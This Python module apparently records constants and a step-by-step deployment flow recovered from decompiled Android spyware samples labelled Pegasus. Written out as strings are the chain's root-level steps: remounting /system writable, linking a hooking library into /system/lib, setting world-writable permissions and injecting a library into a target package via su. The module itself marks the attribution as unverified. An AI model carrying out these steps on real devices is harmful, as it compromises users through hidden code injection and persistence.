"""Extracted Pegasus / Android spyware chain constants and flow.

Source: Pegasus samples (jadx-decompiled), ported under
framework/src/android/samples/unverified/. This module captures the
recovered native-payload deployment chain (xxGameAssistant / Pegasus
Android) so the operational framework can reference it without re-parsing
the decompiled Java.
"""

# Native payload files dropped by the Pegasus Android chain
NATIVE_EXE_FILES = ["inject"]
NATIVE_SO_FILES = ["libghost.so", "libhook.so"]
SUBSTRATE_LIB = "libsubstrate.so"
SUBSTRATE_SOURCE = "/data/data/com.xxGameAssistant.pao/lib/libsubstrate.so"
SUBSTRATE_SYSTEM_TARGET = "/system/lib/libsubstrate.so"

# Install directories
CACHE_DIR_REL = "pao/"
SO_DIR = "/data/local/tmp/pao/"

# Target injection
TARGET_FUNC = "kick"          # function name passed to inject binary
PACKAGE_NAME = "com.xxGameAssistant.pao"
GAME_MODE_DEFAULT = "DEFAULT"

# JNI native methods declared by JNIHelper
JNI_NATIVE_METHODS = [
    "nativeSetExternalAssetPath(String)",
    "nativeSetPackageName(String)",
]

# Deployment flow (recovered from InjectHelper + NativeFileInstaller)
DEPLOYMENT_FLOW = [
    "1. Extract assets (inject, libghost.so, libhook.so) to cacheDir/pao/",
    "2. Verify libsubstrate.so present at SUBSTRATE_SOURCE (Cydia Substrate)",
    "3. installGhostAndHook: rm -r SO_DIR; mkdir SO_DIR; chmod 777; dd inject/SOs; chmod 777",
    "4. xx_do_link: mount -o remount,rw /system; ln -s SUBSTRATE_SOURCE /system/lib/libsubstrate.so; chmod 777; mount remount,ro",
    "5. InjectHelper.executeCmd: su -> inject <package> libghost.so kick <gameMode>",
]

# Root / su locations checked
SU_PATHS = ["/system/bin/su", "/system/xbin/su"]

# Process control
TERMINATE_PROCESS = "Process.killProcess(Process.myPid())"

def is_root_device() -> bool:
    import os
    return any(os.path.exists(p) for p in SU_PATHS)

def summary() -> str:
    return (
        "Pegasus Android chain: deploys " + ", ".join(NATIVE_SO_FILES) +
        " + inject via su, links " + SUBSTRATE_LIB + " into /system/lib, "
        "then injects " + PACKAGE_NAME + " (target func '" + TARGET_FUNC + "')."
    )
